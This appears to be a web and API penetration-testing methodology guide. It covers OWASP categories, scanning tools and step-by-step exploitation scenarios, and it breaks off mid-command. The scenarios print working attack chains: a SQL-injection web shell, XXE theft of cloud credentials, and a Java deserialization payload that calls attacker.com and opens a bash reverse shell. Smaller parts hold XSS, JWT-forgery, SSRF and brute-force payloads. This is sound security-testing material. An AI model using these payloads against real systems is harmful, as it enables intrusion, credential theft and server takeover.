
## Methodology Overview

Web application and API security testing identifies vulnerabilities in web-based applications and their APIs by systematically testing against OWASP security standards and industry best practices.

---

## OWASP Framework Integration

### OWASP Top 10 (Web Application Vulnerabilities)

**Discovery:** `standards/frameworks/owasp-llm/` — controls.yaml, questions.yaml (LLM-specific)

**Top 10 Vulnerabilities (2021):**

1. **A01:2021 - Broken Access Control**
   - Vertical privilege escalation
   - Horizontal privilege escalation
   - IDOR (Insecure Direct Object References)
   - Missing function-level access control

2. **A02:2021 - Cryptographic Failures**
   - Sensitive data transmitted in clear text
   - Weak/outdated cryptographic algorithms
   - Missing encryption at rest
   - Improper key management

3. **A03:2021 - Injection**
   - SQL injection (SQLi)
   - NoSQL injection
   - Command injection (OS command injection)
   - LDAP injection
   - XML injection

4. **A04:2021 - Insecure Design**
   - Missing security controls
   - Inadequate threat modeling
   - Insecure design patterns
   - Business logic flaws

5. **A05:2021 - Security Misconfiguration**
   - Default credentials
   - Unnecessary features enabled
   - Error messages revealing stack traces
   - Missing security headers
   - Outdated/unpatched software

6. **A06:2021 - Vulnerable and Outdated Components**
   - Using components with known vulnerabilities
   - Unpatched dependencies
   - Outdated libraries/frameworks
   - Unsupported software versions

7. **A07:2021 - Identification and Authentication Failures**
   - Weak password requirements
   - Credential stuffing vulnerabilities
   - Session fixation
   - Missing MFA
   - Predictable session IDs

8. **A08:2021 - Software and Data Integrity Failures**
   - Insecure deserialization
   - CI/CD pipeline compromise
   - Auto-update without integrity verification
   - Unsigned or unvalidated updates

9. **A09:2021 - Security Logging and Monitoring Failures**
   - Insufficient logging
   - Logs not monitored
   - Lack of alerting
   - Insufficient audit trails

10. **A10:2021 - Server-Side Request Forgery (SSRF)**
    - Internal network access via SSRF
    - Cloud metadata access
    - Port scanning via SSRF
    - Bypassing network controls

---

### OWASP API Security Top 10

**Discovery:** Use WebFetch for latest OWASP API Security Top 10 documentation
**Size:** 367 files, 277.9k tokens

**API-Specific Vulnerabilities:**

1. **API1:2023 - Broken Object Level Authorization (BOLA)**
   - Access to objects belonging to other users
   - Manipulation of IDs in API requests
   - Missing or improper authorization checks

2. **API2:2023 - Broken Authentication**
   - Weak API key generation
   - Missing rate limiting on authentication
   - JWT vulnerabilities (weak signing, none algorithm)
   - Token leakage in URLs/logs

3. **API3:2023 - Broken Object Property Level Authorization**
   - Mass assignment vulnerabilities
   - Excessive data exposure
   - Missing property-level access controls

4. **API4:2023 - Unrestricted Resource Consumption**
   - Missing rate limiting
   - Resource exhaustion attacks
   - Expensive operations without limits
   - Lack of pagination

5. **API5:2023 - Broken Function Level Authorization (BFLA)**
   - Accessing admin functions as regular user
   - Missing role-based access controls
   - Predictable endpoint naming

6. **API6:2023 - Unrestricted Access to Sensitive Business Flows**
   - Automated abuse of legitimate functions
   - Business logic bypass
   - Missing anti-automation controls

7. **API7:2023 - Server Side Request Forgery (SSRF)**
   - Forcing API to make requests to internal resources
   - Cloud metadata service access
   - Internal port scanning

8. **API8:2023 - Security Misconfiguration**
   - Verbose error messages
   - Missing security headers (CORS, CSP)
   - Unnecessary HTTP methods enabled
   - Default configurations

9. **API9:2023 - Improper Inventory Management**
   - Undocumented API endpoints
   - Old API versions still accessible
   - Shadow APIs
   - Zombie APIs

10. **API10:2023 - Unsafe Consumption of APIs**
    - Trusting third-party APIs without validation
    - Following redirects without verification
    - Insufficient data validation from external APIs

---

### OWASP Application Security Verification Standard (ASVS)

**Discovery:** `standards/frameworks/owasp-asvs/v4/` and `standards/frameworks/owasp-asvs/v5/`
**Purpose:** Security requirements and testing levels

**Verification Levels:**

- **Level 1:** Basic security verification (automated testing)
- **Level 2:** Standard security verification (manual + automated)
- **Level 3:** Advanced security verification (comprehensive testing)

**Covers 14 Categories:**
1. Architecture, Design and Threat Modeling
2. Authentication
3. Session Management
4. Access Control
5. Validation, Sanitization and Encoding
6. Stored Cryptography
7. Error Handling and Logging
8. Data Protection
9. Communication
10. Malicious Code
11. Business Logic
12. Files and Resources
13. API and Web Service
14. Configuration

---

### OWASP Web Security Testing Guide (WSTG)

**Discovery:** Use WebFetch for latest OWASP WSTG documentation
**Purpose:** Comprehensive web testing methodology

**Testing Categories:**
- Information Gathering
- Configuration and Deployment Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Input Validation Testing
- Error Handling Testing
- Cryptography Testing
- Business Logic Testing
- Client-Side Testing

---

## Tool Usage Guide

### Web Application Scanning Tools

#### 1. Reaper - Web/API Proxy & Traffic Analyzer

**Purpose:** HTTP/HTTPS proxy with endpoint discovery, traffic capture, and vulnerability analysis. Stores all findings in SQLite database for agent-accessible infrastructure testing.

**Architecture:**
- Runs as Docker container with persistent SQLite database
- Captures live web/API traffic
- Automatically discovers endpoints, parameters, and methods
- Performs vulnerability analysis (BOLA, parameter pollution, injection points)
- Accessed via SSH/Bash using sqlite3 queries

**Access Method:**
```bash
# Query Reaper database via docker exec
docker exec reaper sqlite3 /data/reaper.db "SELECT * FROM endpoints WHERE domain = 'example.com'"
```

**Available Data Tables:**
- `projects` - Testing engagements and project tracking
- `domains` - Discovered domains and hosts
- `endpoints` - HTTP endpoints (methods, paths, parameters)
- `requests` - Captured HTTP requests
- `responses` - Captured HTTP responses
- `vulnerability_analysis` - Detected vulnerabilities

**Common Queries:**

**List all discovered endpoints for a domain:**
```bash
docker exec reaper sqlite3 /data/reaper.db \
  "SELECT method, path, parameters FROM endpoints WHERE domain = 'example.com'"
```

**Find POST endpoints (potential state-changing operations):**
```bash
docker exec reaper sqlite3 /data/reaper.db \
  "SELECT * FROM endpoints WHERE method = 'POST'"
```

**Extract detected BOLA vulnerabilities:**
```bash
docker exec reaper sqlite3 /data/reaper.db \
  "SELECT * FROM vulnerability_analysis WHERE vulnerability_type = 'BOLA'"
```

**Get endpoints with authentication headers:**
```bash
docker exec reaper sqlite3 /data/reaper.db \
  "SELECT * FROM requests WHERE headers LIKE '%Authorization%'"
```

**Expected Use Cases:**
- Automated endpoint discovery during testing
- Traffic capture for manual analysis
- Parameter enumeration for fuzzing
- Vulnerability pattern detection
- Authorization bypass identification

**Workflow:**
1. Configure browser/tool to proxy through Reaper
2. Interact with target application
3. Query Reaper database for discovered endpoints
4. Use discovered endpoints for targeted testing with other tools (sqlmap, ffuf, jwt_tool)

**Parsing:**
- Endpoints with `admin/` or `internal/` paths = Potential authorization issues
- Parameters like `user_id`, `role`, `price` = IDOR/parameter tampering targets
- JWT tokens in headers = Extract for jwt_tool analysis
- API endpoints = Feed to nuclei/sqlmap for vulnerability scanning

---

#### 2. Nuclei - Template-Based Scanner

**Purpose:** Fast vulnerability scanning using community templates

**Basic Scan:**
```bash
nuclei -u https://example.com -t /nuclei-templates/
```

**Expected Output:**
```
[CVE-2021-44228] [critical] Log4Shell Remote Code Execution
[CVE-2022-0543] [high] Redis Lua Sandbox Escape
[weak-cipher] [medium] Weak SSL/TLS Ciphers Detected
```

**Parsing:**
- `[critical]` / `[high]` = Immediate remediation required
- CVE IDs = Check CVSS score and patch availability

---

**Specific Technology Scan:**
```bash
nuclei -u https://example.com -tags wordpress,cve
```

**Options:**
- `-tags`: Filter templates by tags
- `-severity critical,high`: Only run high-severity checks
- `-o results.txt`: Output to file

**Expected Output:**
WordPress-specific CVEs and misconfigurations

---

### Injection Testing Tools

#### 4. SQLMap - SQL Injection Tool

**Purpose:** Automated SQL injection detection and exploitation

**Basic Detection:**
```bash
sqlmap -u "https://example.com/product?id=1" --batch
```

**Expected Output:**
```
[*] testing 'MySQL >= 5.0 AND error-based - WHERE'
[*] testing 'PostgreSQL AND error-based - WHERE'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based' injectable
```

**Parsing:**
"injectable" keyword = Vulnerability confirmed

---

**Database Enumeration:**
```bash
sqlmap -u "https://example.com/product?id=1" --dbs
```

**Expected Output:**
```
available databases [3]:
[*] information_schema
[*] mysql
[*] production_db
```

---

**Table Dumping:**
```bash
sqlmap -u "https://example.com/product?id=1" -D production_db --tables
sqlmap -u "https://example.com/product?id=1" -D production_db -T users --dump
```

**Expected Output:**
```
Database: production_db
Table: users
[1000 entries]
+----+----------+----------------------------------+
| id | username | password_hash                    |
+----+----------+----------------------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2  | john     | 098f6bcd4621d373cade4e832627b4f6 |
```

**Parsing:**
User table dumped = Data breach, critical finding

---

**POST Request SQLi:**
```bash
sqlmap -u "https://example.com/login" --data="username=admin&password=pass" -p username
```

**Options:**
- `--data`: POST data
- `-p`: Parameter to test
- `--level 5`: Aggressive testing (use carefully)

---

#### 5. NoSQL Injection Testing

**Manual Testing (MongoDB):**
```bash
# Using curl to test NoSQL injection:
# Original payload:
curl -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "pass"}'

# NoSQL injection payload:
curl -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

**Expected Response:**
Successful login without valid credentials = NoSQL injection

**Common NoSQL Injection Payloads:**
```json
{"$gt": ""}       # Greater than empty string (MongoDB)
{"$ne": ""}       # Not equal to empty string
{"$regex": ".*"}  # Regex match all
```

---

### API Testing Tools

#### 6. ffuf - Fast Web Fuzzer

**Purpose:** Directory/file discovery, parameter fuzzing, API endpoint discovery

**Directory Fuzzing:**
```bash
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403
```

**Options:**
- `-u`: URL with FUZZ keyword
- `-w`: Wordlist
- `-mc`: Match HTTP codes

**Expected Output:**
```
[Status: 200, Size: 1234, Words: 56] admin
[Status: 200, Size: 5678, Words: 234] api
[Status: 403, Size: 89, Words: 12] backup
```

**Parsing:**
- 200 = Accessible directory
- 403 = Exists but forbidden (try bypass)

---

**Parameter Discovery:**
```bash
ffuf -u https://example.com/api/user?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fw 1
```

**Expected Output:**
```
[Status: 200] id
[Status: 200] user_id
[Status: 200] admin
```

**Parsing:**
Hidden parameters discovered (test for IDOR, authorization bypass)

---

**API Endpoint Fuzzing:**
```bash
ffuf -u https://example.com/api/v1/FUZZ -w api-endpoints.txt -mc 200
```

**Expected Output:**
```
[Status: 200] users
[Status: 200] admin/users
[Status: 200] internal/debug
```

**Parsing:**
`admin/` or `internal/` endpoints = Potential authorization issues

---

#### 7. jwt_tool - JWT Security Testing

**Purpose:** Comprehensive JWT security testing toolkit for token forging, exploitation, and vulnerability detection

**Installation:** Pre-installed in kali-pentest container at `/opt/jwt_tool/`

**Decode and Analyze JWT:**
```bash
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoidXNlciJ9.signature
```

**Expected Output:**
```
Token header values:
[+] alg = HS256
[+] typ = JWT

Token payload values:
[+] user_id = 1
[+] role = user
[+] exp = 1234567890

Signature: VERIFIED (if secret known) or NOT VERIFIED
```

**Parsing:**
- Check for sensitive data in claims (user_id, role, permissions)
- Note the algorithm (HS256, RS256, none)
- Check expiration timestamp

---

**Algorithm Confusion Attack (alg: none):**
```bash
# Test if server accepts unsigned tokens
jwt_tool TOKEN -X a

# The -X a flag tests the "alg: none" vulnerability
```

**Expected Vulnerable Response:**
```
[+] alg: none - VULNERABLE
Server accepted token with no signature
```

**Exploitation:**
If vulnerable, modify claims and remove signature:
```bash
jwt_tool TOKEN -I -pc role -pv admin -X a
```

**Parsing:**
- `VULNERABLE` = Critical - Can forge tokens without signature
- Use modified token to escalate privileges

---

**Key Confusion Attack (RSA → HMAC):**
```bash
# If app uses RS256, try switching to HS256 with public key
jwt_tool TOKEN -X k -pk public.pem
```

**Expected Vulnerable Response:**
```
[+] Key Confusion - VULNERABLE
Server accepted HS256 token signed with RSA public key
```

**Parsing:**
Allows forging tokens using publicly available RSA public key

---

**Weak Secret Brute Force:**
```bash
# Brute force HMAC secret with wordlist
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

**Expected Output:**
```
[+] secret123 is the CORRECT key!
You can use this key to forge new tokens
```

**Forge Token with Discovered Secret:**
```bash
jwt_tool TOKEN -I -pc role -pv admin -S hs256 -p secret123
```

**Expected Output:**
```
[+] Forged token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.new_signature
```

**Parsing:**
- Weak secret cracked = Can forge arbitrary tokens with any claims
- Test forged token for privilege escalation

---

**Claim Manipulation:**
```bash
# Modify specific claim (e.g., user_id, role)
jwt_tool TOKEN -I -pc role -pv admin

# Options:
# -I = Interactive mode
# -pc = Payload claim to modify
# -pv = New value for claim
```

**Common Exploits:**
- Change `role: user` → `role: admin`
- Change `user_id: 123` → `user_id: 1` (target admin user)
- Extend `exp` timestamp to avoid expiration
- Add `is_admin: true` claim

**Expected Vulnerable Response:**
Server accepts modified token = Authorization bypass

---

**Comprehensive Scan:**
```bash
# Run all vulnerability checks automatically
jwt_tool TOKEN -M at -t https://api.example.com/verify
```

**Expected Output:**
```
[+] Testing alg: none
[+] Testing key confusion
[+] Testing null signature
[+] Testing blank password
[+] Testing weak HMAC secret
[+] Testing expired token acceptance

Vulnerabilities found: 2
- alg: none accepted
- Weak secret: password123
```

**Parsing:**
- Automate all JWT vulnerability testing
- Prioritize findings: `alg: none` and weak secrets are critical
- Use discovered vulnerabilities to forge tokens

---

#### 8. curl - API Testing

**Purpose:** Command-line API testing and automation

**GET Request:**
```bash
curl -X GET https://api.example.com/users/1 -H "Authorization: Bearer token123"
```

**Expected Output:**
```json
{
  "id": 1,
  "username": "john",
  "email": "john@example.com"
}
```

---

**POST Request (JSON):**
```bash
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token123" \
  -d '{"username":"newuser","email":"new@example.com"}'
```

**Expected Output:**
```json
{
  "id": 2,
  "username": "newuser",
  "created": true
}
```

---

**IDOR Testing:**
```bash
# Try accessing other users' data
curl -X GET https://api.example.com/users/2 -H "Authorization: Bearer user1_token"
```

**Expected Secure Response:**
```json
{"error": "Unauthorized", "status": 403}
```

**Expected Vulnerable Response:**
```json
{"id": 2, "username": "otheruser", "email": "other@example.com"}
```

**Parsing:**
Access to other user's data = BOLA (Broken Object Level Authorization)

---

### WordPress Security Tools

#### 9. WPScan - WordPress Vulnerability Scanner

**Purpose:** WordPress-specific security scanning

**Basic Scan:**
```bash
wpscan --url https://example.com --api-token YOUR_API_TOKEN
```

**Expected Output:**
```
[+] WordPress version 5.8.1 identified
[!] 3 vulnerabilities identified:
    [!] CVE-2021-XXXXX - Arbitrary File Upload
    [!] CVE-2021-YYYYY - SQL Injection
[+] Plugins found:
    [!] contact-form-7 version 5.4 (outdated)
[+] Themes found:
    [!] twentytwenty version 1.7 (outdated)
```

**Parsing:**
CVEs + outdated plugins/themes = High-priority findings

---

**User Enumeration:**
```bash
wpscan --url https://example.com --enumerate u
```

**Expected Output:**
```
[i] User(s) Identified:
[+] admin (ID: 1)
[+] editor (ID: 2)
```

**Parsing:**
Valid usernames = Use for brute force or targeted attacks

---

**Password Brute Force:**
```bash
wpscan --url https://example.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

**Expected Output (if successful):**
```
[SUCCESS] - admin / password123
```

---

### Web Server Scanners

#### 10. Nikto - Web Server Scanner

**Purpose:** Web server misconfiguration and vulnerability detection

**Basic Scan:**
```bash
nikto -h https://example.com
```

**Expected Output:**
```
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-Content-Type-Options header is not set.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found.
+ /admin/: Admin login page/section found.
+ OSVDB-3092: /backup/: This might be interesting... potential backup directory.
```

**Parsing:**
- `phpinfo.php` exposed = Information disclosure
- `/admin` found = Test for weak authentication
- `/backup` found = Check for sensitive files

---

### GraphQL Testing

**Introspection Query:**
```bash
curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
```

**Expected Output (if enabled):**
```json
{
  "data": {
    "__schema": {
      "types": [
        {"name": "User", "fields": [{"name": "id"}, {"name": "email"}, {"name": "password"}]},
        {"name": "Admin", "fields": [{"name": "secretData"}]}
      ]
    }
  }
}
```

**Parsing:**
Introspection enabled = Full API schema revealed (can find hidden endpoints)

---

**Batch Attack:**
```bash
# Send multiple queries in one request to bypass rate limiting
curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: 1) { email } }"},
    {"query": "{ user(id: 2) { email } }"},
    {"query": "{ user(id: 3) { email } }"}
  ]'
```

**Expected Output:**
Multiple user records = Rate limiting bypassed via batching

---

### Cross-Site Scripting (XSS) Testing

**Reflected XSS Test Payloads:**
```bash
# Basic payload
<script>alert('XSS')</script>

# Bypass filters
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
'"><script>alert(String.fromCharCode(88,83,83))</script>
```

**Testing with Reaper + curl:**
1. Configure browser to proxy through Reaper (localhost:8080)
2. Browse application to discover input fields (search, comment, URL parameters)
3. Query Reaper for discovered endpoints with parameters:
   ```bash
   docker exec reaper sqlite3 /data/reaper.db "SELECT path, parameters FROM endpoints WHERE domain = 'example.com'"
   ```
4. Test each parameter with XSS payloads using curl:
   ```bash
   curl "https://example.com/search?q=<script>alert('XSS')</script>"
   ```

**Expected Vulnerable Response:**
```html
<h1>Search results for: <script>alert('XSS')</script></h1>
```

**Alternative: Nuclei XSS Templates:**
```bash
nuclei -u https://example.com -t nuclei-templates/http/vulnerabilities/xss/
```

**Parsing:**
Unescaped script tag = XSS vulnerability

---

### SSRF (Server-Side Request Forgery) Testing

**Basic SSRF Test:**
```bash
# Test if server makes request to attacker-controlled URL
curl -X POST https://example.com/fetch \
  -d '{"url": "http://attacker.com/callback"}'
```

**Expected Vulnerable Behavior:**
Attacker server receives request from target server

---

**Cloud Metadata Access:**
```bash
# AWS metadata
curl -X POST https://example.com/fetch \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Expected if vulnerable:
{
  "response": "ami-id\nami-launch-index\nami-manifest-path..."
}
```

**Parsing:**
Metadata accessible = Critical SSRF allowing AWS credentials theft

---

## Testing Methodology Structure

### EXPLORE Phase

1. **Scope Review**
   - Read SCOPE.md for target applications/APIs
   - Identify in-scope domains, subdomains, endpoints
   - Understand authentication requirements
   - Note out-of-scope items and rate limiting

2. **Application Reconnaissance**
   - Manual browsing and functionality mapping
   - Technology stack identification (Wappalyzer, whatweb, nuclei)
   - API endpoint discovery (Swagger/OpenAPI docs, Reaper traffic analysis)
   - Authentication mechanism analysis
   - Input point enumeration via Reaper database queries

3. **OWASP Vulnerability Mapping**
   - Map application features to OWASP Top 10
   - Identify potential API vulnerabilities
   - Review ASVS requirements applicable to app
   - Prioritize high-risk areas

### PLAN Phase

1. **Vulnerability Prioritization**
   - High-risk features (authentication, payment, admin)
   - Complex business logic
   - Data-sensitive operations
   - Public-facing endpoints

2. **Tool Inventory Check** (CRITICAL)
   - Review `REGISTRY.json` for available tools across security containers
   - Web/API tools available: Reaper, Nuclei, SQLMap, ffuf, jwt_tool, WPScan, Nikto
   - Query tool registry by domain: `jq '.tools[] | select(.methodologies[] == "web-api")' REGISTRY.json`
   - Verify container availability via SSH: `docker ps`
   - Request deployment if needed

3. **Test Plan Generation**
   - Map OWASP Top 10 to specific tests
   - Document API testing approach per endpoint
   - Include both automated and manual tests
   - Plan for authentication bypass, authorization, injection, etc.
   - Get user approval before testing

### CODE Phase (Testing)

1. **Automated Scanning**
   - Nuclei template scanning (comprehensive vulnerability coverage)
   - SQLMap for SQL injection
   - ffuf for directory/parameter fuzzing
   - Nikto for web server misconfigurations
   - Document findings in Reaper database

2. **Manual Testing**
   - **Authentication Testing**
     - Credential stuffing, brute force
     - Session management flaws
     - JWT vulnerabilities
     - OAuth misconfiguration

   - **Authorization Testing**
     - BOLA/IDOR testing
     - Privilege escalation (vertical/horizontal)
     - BFLA (accessing admin functions)
     - Missing function-level access control

   - **Injection Testing**
     - SQL injection (in-band, blind, time-based)
     - NoSQL injection
     - Command injection
     - Template injection
     - XML/XXE injection

   - **Business Logic Testing**
     - Payment manipulation
     - Workflow bypass
     - Race conditions
     - Parameter tampering

   - **API-Specific Testing**
     - Mass assignment
     - Rate limit bypass
     - Excessive data exposure
     - GraphQL vulnerabilities (introspection, batching)
     - API versioning issues

3. **Evidence Collection**
   - Screenshots of successful exploits
   - Request/response pairs from Reaper database (via SQLite queries)
   - curl commands demonstrating exploitation
   - Proof-of-concept code
   - Map findings to OWASP categories

### COMMIT Phase (Reporting)

1. **Findings Documentation**
   - Executive summary
   - Technical findings mapped to OWASP categories
   - Severity ratings (Critical, High, Medium, Low)
   - Evidence (screenshots, PoC)
   - CVSS scores where applicable

2. **Remediation Recommendations**
   - Specific code fixes
   - Configuration changes
   - Security header recommendations
   - Input validation patterns
   - Reference OWASP Cheat Sheets

3. **OWASP Integration**
   - Map all findings to OWASP Top 10 / API Top 10
   - Include ASVS control references
   - Link to relevant WSTG sections

---

## Common Web/API Vulnerabilities

### Authentication & Session Management
- **Weak Password Policy:** No complexity requirements
- **Missing MFA:** Single-factor authentication only
- **Session Fixation:** Session ID not regenerated after login
- **Predictable Session Tokens:** Sequential or weak randomness
- **JWT Issues:** None algorithm, weak secrets, lack of expiration

### Authorization
- **IDOR:** User can access other users' data via ID manipulation
- **Missing Function-Level Access Control:** Regular user accessing admin endpoints
- **Path Traversal:** Access to unauthorized files via ../ manipulation
- **CORS Misconfiguration:** Overly permissive CORS allowing credential theft

### Injection Vulnerabilities
- **SQL Injection:** Union-based, Boolean-based, Time-based blind SQLi
- **Command Injection:** OS command execution via unsanitized input
- **NoSQL Injection:** MongoDB, CouchDB injection attacks
- **LDAP Injection:** Authentication bypass via LDAP
- **SSTI (Server-Side Template Injection):** RCE via template engines
- **XXE (XML External Entity):** XML parser vulnerabilities

### Business Logic
- **Race Conditions:** Multiple simultaneous requests causing logic bypass
- **Price Manipulation:** Negative quantities, decimal manipulation
- **Workflow Bypass:** Skipping payment steps
- **Insufficient Process Validation:** Missing state checks

### API-Specific
- **Mass Assignment:** Modifying protected fields via API
- **Excessive Data Exposure:** API returning unnecessary sensitive data
- **Lack of Rate Limiting:** Brute force, resource exhaustion
- **GraphQL Issues:** Introspection enabled, deep nesting, batching attacks

### Information Disclosure
- **Verbose Error Messages:** Stack traces, database errors
- **Source Code Disclosure:** .git, .svn, backup files exposed
- **Directory Listing:** Enabled on web server
- **API Documentation Exposure:** Swagger UI publicly accessible

---

## Real-World Web/API Exploitation Scenarios

### Scenario 1: SQL Injection to Remote Code Execution

```bash
# Step 1: Discover SQL injection
sqlmap -u "https://target.com/product?id=1" --batch --dbs

# Expected output:
[*] information_schema
[*] mysql
[*] production_db

# Step 2: Enumerate database users and privileges
sqlmap -u "https://target.com/product?id=1" --users --privileges

# Expected output:
database management system users [2]:
[*] 'app_user'@'%'
[*] 'root'@'localhost'

database management system users privileges:
[*] app_user [1]:
    privilege: FILE

# Step 3: Read /etc/passwd using FILE privilege
sqlmap -u "https://target.com/product?id=1" --file-read="/etc/passwd"

# Expected output:
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

# Step 4: Write web shell using INTO OUTFILE
# Note: Requires UNION injection and FILE privilege
sqlmap -u "https://target.com/product?id=1" --sql-shell

# Execute SQL:
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Step 5: Access web shell for RCE
curl "https://target.com/shell.php?cmd=id"

# Expected output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Impact:** Complete server compromise via SQLi → File write → RCE

**Mitigation:**
- Parameterized queries (never concatenate SQL)
- Remove FILE privilege from database users
- Web application firewall (WAF)
- Least privilege database accounts

---

### Scenario 2: XXE to SSRF to Cloud Metadata Access

```bash
# Step 1: Identify XML parsing endpoint
# Test with simple XXE payload
curl -X POST https://api.target.com/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>'

# Expected if vulnerable:
<response>
  <data>root:x:0:0:root:/root:/bin/bash...</data>
</response>

# Step 2: Test for SSRF via XXE (external entity)
curl -X POST https://api.target.com/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/callback">]>
<root>
  <data>&xxe;</data>
</root>'

# Check attacker server logs:
# GET /callback - Source: target.com server IP

# Step 3: Exploit SSRF to access AWS metadata service
curl -X POST https://api.target.com/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>
  <data>&xxe;</data>
</root>'

# Expected output:
<response>
  <data>ec2-instance-role</data>
</response>

# Step 4: Retrieve AWS credentials
curl -X POST https://api.target.com/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role">]>
<root>
  <data>&xxe;</data>
</root>'

# Expected output:
<response>
  <data>{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "wJalr...",
    "Token": "IQoJ..."
  }</data>
</response>

# Step 5: Use stolen AWS credentials
aws s3 ls --profile stolen-creds
# List all S3 buckets with compromised credentials
```

**Impact:** XXE → SSRF → AWS credential theft → Cloud infrastructure compromise

**Mitigation:**
- Disable XML external entities in parsers
- Block access to 169.254.169.254 at network level (AWS IMDSv2)
- Input validation (reject DOCTYPE declarations)
- Use less dangerous data formats (JSON instead of XML)

---

### Scenario 3: Java Deserialization to Remote Code Execution

```bash
# Step 1: Identify Java application with serialized objects
# Look for Base64-encoded cookies or POST data starting with "rO0AB" (Java serialization magic bytes)

curl -v https://target.com/app
# Look in response headers:
Set-Cookie: session=rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcAAA...

# Step 2: Decode and analyze serialized object
echo "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcAAA..." | base64 -d | xxd | head
# Output shows Java serialization format

# Step 3: Generate malicious payload using ysoserial
# Requires: Common vulnerable libraries (Apache Commons Collections, Spring, etc.)
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' | base64 -w0

# Output: Base64-encoded malicious serialized object
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlc...

# Step 4: Send malicious serialized object
curl -X POST https://target.com/app \
  -H "Cookie: session=rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlc..."

# Check attacker server:
# GET /pwned - Source: target.com (RCE confirmed)

# Step 5: Escalate to reverse shell
java -jar ysoserial.jar CommonsCollections6 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64 -w0

# On attacker machine:
nc -lvp 4444

# Send payload:
curl -X POST https://target.com/app -H "Cookie: session=<malicious_payload>"

# Reverse shell obtained:
bash-4.2$ id
uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
```

**Impact:** Deserialization vulnerability → Remote Code Execution → Server compromise

**Mitigation:**
- Never deserialize untrusted data
- Use safe serialization formats (JSON, Protocol Buffers)
- Implement deserialization filters (Java 9+)
- Update vulnerable libraries (Commons Collections, Spring, etc.)
- Sign/encrypt serialized objects
- Monitor for ysoserial patterns

---

### Scenario 4: JWT None Algorithm Attack to Account Takeover

```bash
# Step 1: Capture JWT token
curl -X POST https://api.target.com/login \
  -d '{"username":"user@example.com","password":"password123"}' \
  -H "Content-Type: application/json"

# Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0LCJyb2xlIjoidXNlciIsImV4cCI6MTcwMDAwMDAwMH0.signature_here"
}

# Step 2: Decode JWT to inspect claims
jwt decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0LCJyb2xlIjoidXNlciIsImV4cCI6MTcwMDAwMDAwMH0.signature_here

# Output:
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "user_id": 1234,
    "role": "user",
    "exp": 1700000000
  }
}

# Step 3: Craft malicious JWT with "none" algorithm
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user_id":1,"role":"admin","exp":1700000000}  # Changed to admin user

echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '+/' '-_'
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

echo -n '{"user_id":1,"role":"admin","exp":1700000000}' | base64 -w0 | tr -d '=' | tr '+/' '-_'
# Output: eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9

# Combine with empty signature (note the trailing dot):
MALICIOUS_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9."

# Step 4: Test malicious JWT
curl -X GET https://api.target.com/admin/users \
